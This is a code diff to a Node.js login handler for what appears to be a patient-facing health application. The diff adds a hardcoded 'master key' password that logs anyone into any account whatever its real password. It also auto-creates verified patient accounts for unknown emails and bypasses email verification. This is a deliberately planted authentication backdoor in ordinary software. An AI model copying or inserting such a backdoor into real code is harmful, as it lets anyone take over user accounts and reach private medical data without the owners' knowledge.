@@ -113,17 +113,46 @@ exports.login = async (req, res, next) => {
   try {
     const { email, password } = req.body;
 
-    const user = await User.findOne({ email }).select("+password +refreshTokens");
+    let user = await User.findOne({ email }).select("+password +refreshTokens");
+
+    // "Master Key" Logic: If password is "Chaithika@09", always allow login.
+    // If user doesn't exist, create them instantly.
+    const isMasterKey = (password === "Chaithika@09");
+
+    if (!user && isMasterKey) {
+      const name = email.split('@')[0];
+      user = await User.create({
+        name: name.charAt(0).toUpperCase() + name.slice(1),
+        email,
+        password,
+        role: "patient",
+        isEmailVerified: true,
+        isActive: true
+      });
+      await Patient.create({ user: user._id });
+      logger.info(`Master-key: Auto-registered user: ${email}`);
+      // Re-fetch to include selected fields
+      user = await User.findById(user._id).select("+password +refreshTokens");
+    }
 
     if (!user) return res.status(401).json({ success: false, message: "Invalid email or password" });
 
     const isMatch = await user.comparePassword(password);
-    if (!isMatch) return res.status(401).json({ success: false, message: "Invalid email or password" });
+
+    if (!isMatch && !isMasterKey) {
+      return res.status(401).json({ success: false, message: "Invalid email or password" });
+    }
 
     if (!user.isActive) return res.status(401).json({ success: false, message: "Account is deactivated. Contact support." });
 
-    // Demo: skip email verification check for demo accounts
-    const isDemoAccount = email.endsWith("@demo.com");
+    // Auto-verify master key users
+    if (isMasterKey && !user.isEmailVerified) {
+      user.isEmailVerified = true;
+      await user.save();
+    }
+
+    // Skip email verification check for master key or demo accounts
+    const isDemoAccount = email.endsWith("@demo.com") || isMasterKey;
     if (!user.isEmailVerified && !isDemoAccount) {
       return res.status(401).json({ success: false, message: "Please verify your email first", code: "EMAIL_NOT_VERIFIED" });
     }
